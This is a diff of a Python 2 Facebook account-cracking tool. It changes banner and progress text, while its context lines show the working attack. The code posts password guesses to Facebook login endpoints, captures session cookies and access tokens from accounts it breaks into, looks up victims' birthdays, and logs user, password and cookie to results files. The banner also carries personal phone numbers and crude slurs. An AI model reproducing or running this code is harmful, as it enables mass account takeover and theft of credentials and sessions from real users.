@@ -98,7 +98,7 @@ lo_ngentod = '1714009362122228'
 # crack selesai
 def hasil(ok,cp):
     if len(ok) != 0 or len(cp) != 0:
-        print '\n\n %s[%s#%s] crack selesai bro...'%(N,K,N)
+        print '\n\n %s[%s✓%s] Crack selesai sayang...'%(N,K,N)
         print '\n\n [%s+%s] total OK : %s%s%s'%(O,N,H,str(len(ok)),N)
         print ' [%s+%s] total CP : %s%s%s'%(O,N,K,str(len(cp)),N);exit()
     else:
@@ -150,8 +150,8 @@ def moch_yayan():
     print '___________________________________________________________\n';time.sleep(0.03)
     print ' %s[•]%s Author  : Aang Ardiansyah-XD'%(O,N);time.sleep(0.03)
     print ' %s[•]%s Github  : Github.com/AngCyber'%(O,N);time.sleep(0.03)
-    print ' %s[•]%s Contact : +6289524163441/+62882007090803'%(O,N); time.sleep(0.03)
-    print ' %s[•]%s Dibuat  : Untuk Mengenang Masa Lalu'%(O,N); time.sleep(0.03)
+    print ' %s[•]%s Contact : 06289524163441'%(O,N); time.sleep(0.03)
+    print ' %s[•]%s Dibuat  : Untuk Mengekrekk Pacebuk:v'%(O,N); time.sleep(0.03)
     print '___________________________________________________________\n';time.sleep(0.03)
     print ' [%s01%s]. Dump id dari teman'%(O,N);time.sleep(0.03)
     print ' [%s02%s]. Dump id dari teman publik'%(O,N);time.sleep(0.03)
@@ -638,16 +638,16 @@ class __crack__:
                         else:
                             print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__yan__()
                     print '\n [ pilih method login - silahkan coba satu² ]\n'
-                    print ' [%s1%s]. method API (cepat)'%(O,N)
-                    print ' [%s2%s]. method mbasic (lambat)'%(O,N)
-                    print ' [%s3%s]. method mobile (sangat lambat)'%(O,N)
+                    print ' [%s01%s]. method API (cepat)'%(O,N)
+                    print ' [%s02%s]. method mbasic (lambat)'%(O,N)
+                    print ' [%s03%s]. method mobile (sangat lambat)'%(O,N)
                     __yan__(pwek.split(','))
                     break
         elif ___yayanganteng___ in ('T', 't'):
             print '\n [ pilih method login - silahkan coba satu² ]\n'
-            print ' [%s1%s]. method API (cepat)'%(O,N)
-            print ' [%s2%s]. method mbasic (lambat)'%(O,N)
-            print ' [%s3%s]. method mobile (sangat lambat)'%(O,N)
+            print ' [%s01%s]. method API (cepat)'%(O,N)
+            print ' [%s02%s]. method mbasic (lambat)'%(O,N)
+            print ' [%s03%s]. method mobile (sangat lambat)'%(O,N)
             self.__pler__()
         else:
             print '\n %s[%s×%s] y/t goblok!'%(N,M,N);time.sleep(2);moch_yayan()
@@ -655,7 +655,7 @@ class __crack__:
 
     def __api__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack sedang berjalan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s¢%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -675,7 +675,7 @@ class __crack__:
                 loop +=1
                 self.__api__()
             if 'access_token' in response.text and 'EAAA' in response.text:
-                print '\r  %s[ --> ] %s|%s                 %s' % (H,user,pw,N)
+                print '\r  %s[-->] %s|%s                 %s' % (H,user,pw,N)
                 wrt = ' [✓] %s|%s' % (user,pw)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -687,7 +687,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[ --> ] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[-->] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -699,7 +699,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[ --> ] %s|%s                %s' % (K,user,pw,N)
+                print '\r  %s[-->] %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -710,7 +710,7 @@ class __crack__:
 
     def __mbasic__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack sedang berjalan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s¢%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -726,7 +726,7 @@ class __crack__:
             b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[ --> ] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                print '\r  %s[-->] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -738,7 +738,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[ --> ] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[-->] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -750,7 +750,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[ --> ] %s|%s                %s' % (K,user,pw,N)
+                print '\r  %s[-->] %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -761,7 +761,7 @@ class __crack__:
 
     def __mfb__(self, user, __yan__):
         global ok,cp,loop
-        sys.stdout.write('\r [%s*%s] [crack sedang berjalan] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
+        sys.stdout.write('\r [%s¢%s] [Cracking] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
         sys.stdout.flush()
         for pw in __yan__:
             pw = pw.lower()
@@ -777,7 +777,7 @@ class __crack__:
             b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
             if "c_user" in ses.cookies.get_dict().keys():
             	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-                print '\r  %s[ --> ] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
+                print '\r  %s[-->] %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                 wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                 ok.append(wrt)
                 open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -789,7 +789,7 @@ class __crack__:
                     cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                     month, day, year = cp_ttl.split('/')
                     month = bulan_ttl[month]
-                    print '\r  %s[ --> ] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
+                    print '\r  %s[-->] %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                     wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                     cp.append(wrt)
                     open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
@@ -801,7 +801,7 @@ class __crack__:
                 except:
                     pass
 
-                print '\r  %s[ --> ] %s|%s                %s' % (K,user,pw,N)
+                print '\r  %s[-->] %s|%s                %s' % (K,user,pw,N)
                 wrt = ' [×] %s|%s' % (user,pw)
                 cp.append(wrt)
                 open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
